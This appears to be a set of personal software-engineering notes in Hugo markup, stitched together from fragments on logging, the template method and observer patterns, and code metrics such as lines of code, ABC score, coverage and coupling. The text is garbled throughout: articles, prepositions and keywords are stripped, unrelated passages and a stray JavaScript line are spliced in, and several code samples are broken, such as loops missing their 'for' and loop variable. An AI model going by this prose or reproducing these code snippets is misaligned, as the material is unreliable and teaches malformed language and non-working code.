\n \n {{% priors %}} \n \n definition? debugging involves inspecting program\'s internal state. \n \n {{% /priors %}} \n \n ### `printf` debugging logging \n \n `printf` debugging, one adds print statements keeps iterating \n enough information extracted. {{% cite \n missingsemester2020debuggingandprofiling %}} \n \n using logging several advantages `printf` debugging: varying logging \n destinations (e.g. standard output, files, sockets, remote servers, etc.); \n severity levels (e.g. `info`, `debug`, `warn`, `error`, `&c`) support \n filtering output; color-coding readability. {{% cite \n missingsemester2020debuggingandprofiling %}} \n \n {{% comment %}} \n \n terminals varying levels color support: plain color; ansi escape codes \n (16 color codes bold/italic background); 256 color palette; 24-bit \n truecolor ("888" colors, aka 16 million, e.g. `printf \n "\\x1b[38;2;255;100;0mtruecolor\\x1b[0m\\n"`). {{% cite termstandardcolors %}} \n \n {{% /comment %}} \n \n logging also disabled various contexts. example, chromium compiles \n away `dlog` statements no-op non-debug builds. {{% cite chromiumlogging \n %}} \n \n {{% comment %}} \n \n principle though, one also compile away `printf` statements no-ops \n various execution contexts. instance, {{% cite chromiumlogging %}} \n re-defines `assert(x)` `dlog_assert(x)`. similar treatment applied \n `printf`. \n \n {{% /comment %}} \n \n programs write logs standardized location (sometimes \n shell-provided program like `logger`). unix systems, logs usually written \n `/var/log`. may specialized terminal utilities displaying \n logs, e.g. \n [`journalctl`](https://www.man7.org/linux/man-pages/man1/journalctl.1.html) \n linux, [`log show`](https://www.manpagez.com/man/1/log/) macos. {{% cite \n

specifying two things: interface \n (because `public`), implementation detail (because derived \n classes replace implementation). {{% cite sutter2001 %}} \n \n separate interface internals, consider template method \n pattern: \n \n ```cpp \n class widget { \n public: \n int process(gadget&); // uses doprocess...() \n bool isdone(); // uses doisdone() \n \n private: \n virtual int doprocessphase1(gadget&); \n virtual int doprocessphase2(gadget&); \n virtual bool doisdone() = 0; \n }; \n ``` \n \n separation, several benefits: \n \n * base class complete control interface policy. \n enforce invariants, insert instrumentation non-virtual \n interface functions. \n * interface implementation changed independently, \n e.g. adding `doprocessphase3` would affect classes

\n cardsmanager.initializefromminicards([{ _id: cardidtoshow, urgency, tags}], includetagneighbors=true); \n \n // home \n cardsmanager = new cardsmanager(tagsandids, currentuserid, \'/read-card\', mini_cards);

\n \n ### communication flow \n \n `concrete_observer` calls `concrete_subject->setstate(new_state)`, \n `concrete_observer` hold making internal updates \n receives update notification `concrete_subject`. deferral \n important may objects call \n `concrete_subject->setstate(new_state)`. \n \n {{% comment %}} \n also want two internal updates `concrete_observer` \n first one jumping gun. also, `concrete_subject` rejects \n `new_state`? overly eager updates could make `concrete_observer` inconsistent. \n {{% /comment %}} \n \n {{% comment %}} \n sure, design feels weird. would observer modifying state \n subject? think relationship subject \n observer, think observer less passive. {{% cite \n wikiobserverpattern %}} seems hold \n observer-is-passive-with-regard-to-updates idea too. \n {{% /comment %}} \n \n calls `subject::notify`? state-setting ops `subject` call `notify`, \n might several consecutive ops cause several consecutive updates, \n may inefficient. clients responsible, errors likely since \n clients might forget it. \n \n ### avoiding dangling references \n \n deleting subject produce dangling references observers. one \n solution subject notify observers deleted, \n observers reset reference it. deleting observers \n solution observers might referenced elsewhere, e.g. listening \n subjects. \n \n {{% open-comment %}} \n chromium opt `scopedobservation` \n `scopedmultisourceobservation` expose subject(s)? {{% cite \n chromiumscopedobservation %}} {{% cite chromiumscopedmultisourceobservation %}} \n {{% /open-comment %}} \n \n ### maintaining consistency `subject` \n \n also need ensure subject self-consistent notification. \n example, code buggy: \n \n ```cpp \n void mysubject::operation(int new_value) { \n baseclasssubject::operation(new_value); \n // trigger notification. \n my_internal_value_ += new_value; \n // update subclass state (too late!) \n } \n ``` \n \n one solution send notifications template methods abstract \n `subject` class, e.g. \n \n ```cpp \n void text::cut(textrange r) { \n replacerange(r); // redefined subclasses. \n notify(); \n } \n ``` \n \n ### specificity/efficiency `update` protocols \n \n there\'s tradeoff specificity `update` protocols. push model, \n subject sends detailed information change, pull \n model, subject sends minimal notification, observers \n must explicitly ask details. push model makes observers less re-usable, \n pull method may inefficient. \n \n allowing observers register specific events interest improve \n update efficiency. api like one possible solution: \n \n ```cpp \n void subject::attach(observer*, aspect& interest); \n \n void observer::update(subject*, aspect& interest); \n ``` \n \n {{% comment %}} \n step could `subject` sending notifications observers \n interested `aspect` affected subject\'s \n state change. \n \n alternatively, common pattern see chromium subclassing base \n `observer` interface, providing specific apis, e.g. \n `clocktimerobserver::onhourchanged(clocktimer* timer, int new_hour)`. \n {{% /comment %}} \n \n cases, updates may inundate observer, e.g. subject\'s \n changing state several times second. observer may incorporate timer \n represent approximate state model regular interval. {{% cite \n wikiobserverpattern %}} \n \n ### orchestrating complex relationships subjects observers \n \n dependency relationships subjects observers may complex, e.g. \n operation involves changes several interdependent subjects, \n need ensure observers notified subjects \n modified, `changemanager` useful: \n \n ```cpp \n void subject::notify() { \n change_manager_->notify(); \n } \n \n class changemanager { \n public: \n register(subject*, observer*); \n unregister(subject* observer*); \n notify(); \n } \n \n void changemanager::notify() { \n // naive implementation sends notifications observers. \n (subject* : subjects_) { \n (observer* : s->observers) { \n o->update(s); \n } \n } \n } \n ``` \n \n `changemanager::notify` smarter, e.g. maintaining dag \n `observer* o` observes multiple subjects, `o->update(s)` \n called avoid redundant updates. \n \n {{% comment %}} \n `changemanager` instance `mediator` pattern. \n {{% /comment %}} \n \n ### combining `subject` `observer` interfaces class \n \n note languages, e.g. smalltalk, lack multiple inheritance (mi). \n cases, makes sense combine `observer` `subject` interface \n class. \n \n {{% comment %}} \n lack mi anomaly. c++ got mi hybrid (contains \n primitives objects) language enforce single monolithic class \n hierarchy, unlike smalltalk. \n \n mi\'s famous drawback diamond problem prominent con. \n example: `d` inherits `c` `b`, inherit `a`. \n `b` `c` override `a::foo`, `d` not; `d->foo()` called, \n `foo` gets called? \n \n good occam\'s razor is, "if need upcast base \n classes, prefer composition multiple inheritance." \n \n {{% cite eckel1999 %}} \n {{% /comment %}} \n \n

example: \n \n * easy achieve task, e.g., disable feature x. \n * need pull bunch components high levels \n abstraction. \n * tightly components coupled? \n * tests need workarounds like mocks access private members? \n * readable code? \n * given function, much branching state mutation occurs? \n * files people confident make changes?\' \n \n however, qualitative metrics scale well need active human \n input. \n \n quantitative metrics collected passively, ring alarm bells \n necessary. however, lose accuracy quantitative models simplify \n complex/rich reality. \n \n avoid metrics goals themselves, paying attention \n warnings rather "good" values seems prudent. example, low readability \n score important/informative high one, low score provides \n starting point focusing improvement efforts. \n \n {{% /priors %}} \n \n wikipedia\'s [software metric](https://en.wikipedia.org/wiki/software_metric) \n page links couple metrics, launchpad targeted \n investigations. \n \n **control-flow graphs** come metrics discussions. control-flow graph \n (cfg) graphical representation paths might traversed \n program execution. cfgs essential many compiler \n optimizations static analysis tools. {{% cite wikicfg %}} \n \n ### source lines code \n \n **source lines code** used measure size program counting \n number lines. useful comparisons tend involve order magnitude \n loc, e.g., comparing 10k loc project 100k loc project far useful \n comparing 20k loc project 21k loc project. {{% cite wikiloc %}} \n \n common definition **physical sloc (loc)** count lines \n text program\'s source code, excluding comment lines. **logical sloc \n (lloc)** tries measure number executable statement vary \n language. example, \n \n ```c \n (i = 0; < 100; i++) printf("hello"); /* many loc this? */ \n ``` \n \n ... 1 physical loc, 2 lloc (`for` statement `printf` statement), 1 \n comment line. {{% cite wikiloc %}} \n \n loc, especially physical loc, automatically determined, intuitive, \n ubiquitous given early debut. however: \n \n * standard definition line code is, e.g., data \n declarations included? \n * measure productivity, limited, e.g., coding phase accounts \n ~30% overall effort; skilled devs may achieve high functionality \n lower loc. \n * different languages (or even gui tools) different verbosities. \n furthermore, projects use multiple languages, nuance lost \n loc combined. \n \n {{% cite wikiloc %}} \n \n ### abc score \n \n **abc score** represented 3-d vector `<assignments (a), branches \n (b), conditionals (c)>`. unlike source lines code (sloc) measure, abc \n score independent coding style, therefore robust measure \n code size. {{% cite wikiabcsoftwaremetric %}} \n \n {{% comment %}} \n \n loc quite popular measure. part ease

percentage code executed test suite. \n **function coverage** checks function program called. \n **statement coverage** checks statement program \n executed. **edge coverage** checks edge control-flow graph \n executed. **condition coverage** checks boolean sub-expression \n evaluated `true` `false`. {{% cite wikicodecoverage %}} \n \n {{% comment %}} \n \n discussion test coverage [testing

connascence \n \n two components **connascent** change one requires \n modified order maintain overall correctness system. **static \n connascences** include: name entity, type entity, conventions (e.g. \n `-1` mean "invalid"), order values (e.g. positional parameters), choice \n algorithm (e.g. message authentication codes). **dynamic connascences** include: \n order execution multiple components important; timing \n execution multiple components important; several values much change \n together; multiple components must reference entity. {{% cite \n wikiconnascence %}} \n \n ### cohesion \n \n **cohesion** refers degree elements inside module belong \n together. much common methods class have? methods carry \n small number related activities. related methods source \n file/folder? {{% cite wikicohesioncs %}} \n \n {{% comment %}} \n \n {{% cite wikicohesioncs %}} ranks **coincidental cohesion** worst: \n *coincidental cohesion parts module grouped arbitrarily; \n

equivalent "every toggle/setting program sign \n product manager failed make decision." \n \n {{% /comment %}} \n \n ### coupling \n \n **coupling** measure closely connected two routines modules are. \n low coupling often correlates high cohesion vice-versa. tightly coupled \n systems exhibit: [connascence](#connascence), higher cost assembling modules, \n low reusability testability dependent modules must also included. {{% \n cite wikicoupling %}} \n \n ### comment density \n \n **comment density**, percentage comment lines within code, \n measure code readability, self-descriptiveness,
